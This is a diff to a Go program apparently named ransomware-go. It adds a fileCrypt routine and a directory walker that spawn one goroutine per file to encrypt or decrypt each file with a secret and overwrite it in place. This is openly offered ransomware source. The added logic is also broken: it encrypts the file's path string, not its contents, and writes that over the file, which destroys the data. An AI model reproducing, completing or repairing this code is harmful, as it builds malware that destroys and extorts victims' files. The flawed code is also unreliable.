@@ -8,6 +8,8 @@ import (
 	"path/filepath"
 	"fmt"
 	"strings"
+	"ransomware-go/crypt"
+	"io/ioutil"
 )
 
 var (
@@ -33,8 +35,18 @@ func init() {
 	}
 }
 
-func fileCrypt(filePath string)  {
+func fileCrypt(filePath string) {
+	defer wg.Done()
 
+	var newFileName string
+
+	if decrypt {
+		newFileName = crypt.Decrypt([]byte(filePath), secret)
+	} else {
+		newFileName = crypt.Encrypt([]byte(filePath), secret)
+	}
+
+	ioutil.WriteFile(filePath, []byte(newFileName), 0644)
 }
 
 func start(path string) {
@@ -48,17 +60,17 @@ func start(path string) {
 	}
 
 	switch mode := pathInfo.Mode(); {
-		case mode.IsDir():
-			filepath.Walk(path, func(relativePath string, info os.FileInfo, err error) error {
-				if strings.Compare(path, relativePath) != 0 {
-					wg.Add(1)
-					go fileCrypt(relativePath)
-				}
-				return nil
-			})
-		case mode.IsRegular():
-			wg.Add(1)
-			go fileCrypt(path)
+	case mode.IsDir():
+		filepath.Walk(path, func(relativePath string, info os.FileInfo, err error) error {
+			if strings.Compare(path, relativePath) != 0 {
+				wg.Add(1)
+				go fileCrypt(relativePath)
+			}
+			return nil
+		})
+	case mode.IsRegular():
+		wg.Add(1)
+		go fileCrypt(path)
 	}
 }
 
